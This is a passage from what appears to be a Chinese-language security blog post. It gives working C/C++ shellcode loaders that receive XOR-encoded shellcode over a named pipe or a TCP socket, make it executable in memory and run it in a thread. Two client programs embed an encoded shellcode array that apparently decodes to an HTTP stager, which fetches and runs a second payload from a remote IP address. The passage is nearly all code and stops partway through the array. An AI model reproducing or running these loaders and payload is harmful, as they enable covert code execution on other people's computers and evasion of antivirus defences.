class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">&quot;\.\pipe\BadCodeTest&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hPipe;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    CHAR szBuffer[BUFF_SIZE];</span><br><span class="line">    DWORD dwLen;</span><br><span class="line">    PCHAR pszShellcode = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    <span class="comment">// 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span></span><br><span class="line">    hPipe = CreateNamedPipe(</span><br><span class="line">        ptsPipeName,</span><br><span class="line">        PIPE_ACCESS_INBOUND,</span><br><span class="line">        PIPE_TYPE_BYTE| PIPE_WAIT,</span><br><span class="line">        PIPE_UNLIMITED_INSTANCES,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Create Pipe Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ConnectNamedPipe(hPipe,<span class="literal">NULL</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Client Connected...\n&quot;</span>);</span><br><span class="line">        ReadFile(hPipe,szBuffer,BUFF_SIZE,&amp;dwLen,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Get DATA Length : %d \n&quot;</span>,dwLen);</span><br><span class="line">        <span class="comment">// 申请内存页</span></span><br><span class="line">        pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">        <span class="comment">// 拷贝内存</span></span><br><span class="line">        CopyMemory(pszShellcode,szBuffer,dwLen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwLen; i++)&#123;</span><br><span class="line">            Sleep(<span class="number">50</span>);</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// 执行Shellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// 函数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>BadCodePipeClient</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">&quot;\.\pipe\BadCodeTest&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RecvShellcode</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">    HANDLE hPipeClient;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    DWORD dwShellcodeSize = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="comment">// 等待管道可用</span></span><br><span class="line">    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);</span><br><span class="line">    <span class="comment">// 连接管道</span></span><br><span class="line">    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipeClient == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Can&#x27;t Open Pipe , Error : %d \n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WriteFile(hPipeClient,buf,dwShellcodeSize,&amp;dwWritten,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(dwWritten == dwShellcodeSize)&#123;</span><br><span class="line">        CloseHandle(hPipeClient);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Send Success ! Shellcode : %d Bytes\n&quot;</span>,dwShellcodeSize);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hPipeClient);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    RecvShellcode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="网络套接字（socket）"><a href="#网络套接字（socket）" class="headerlink" title="网络套接字（socket）"></a>网络套接字（socket）</h2><p>通过建立一个客户端和服务端，进行Shellcode的收发，类似于Java中的反序列化。</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1a40f881fa1acfbe75f302bfff33a013.png"></p>
<p>Server:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RunCode</span><span class="params">(CHAR * code,DWORD dwCodeLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    PCHAR pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwCodeLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">    CopyMemory(pszShellcode,code,dwCodeLen);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwCodeLen; i++)&#123;</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwCodeLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// 执行Shellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// 函数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">        );</span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR argv[])</span></span>&#123;</span><br><span class="line">    CHAR buf[<span class="number">801</span>];</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    WORD sockVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET socks;</span><br><span class="line">    SOCKET sClient;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">s_client</span>;</span></span><br><span class="line">    INT nAddrLen = <span class="keyword">sizeof</span>(s_client);</span><br><span class="line">    SHORT sListenPort = <span class="number">8888</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (socks == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_port = htons(sListenPort);</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.S_un.S_addr = INADDR_ANY;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(bind(socks,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) == SOCKET_ERROR )</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">listen</span>(socks, <span class="number">5</span>) == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Listen  Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sClient = accept(socks, (SOCKADDR *)&amp;s_client, &amp;nAddrLen);</span><br><span class="line">    <span class="keyword">int</span> ret = recv(sClient,buf,<span class="keyword">sizeof</span>(buf),<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Recv %d-Bytes \n&quot;</span>,ret);</span><br><span class="line">        closesocket(sClient);</span><br><span class="line">        closesocket(socks);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WSACleanup();</span><br><span class="line">    RunCode(buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Client:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\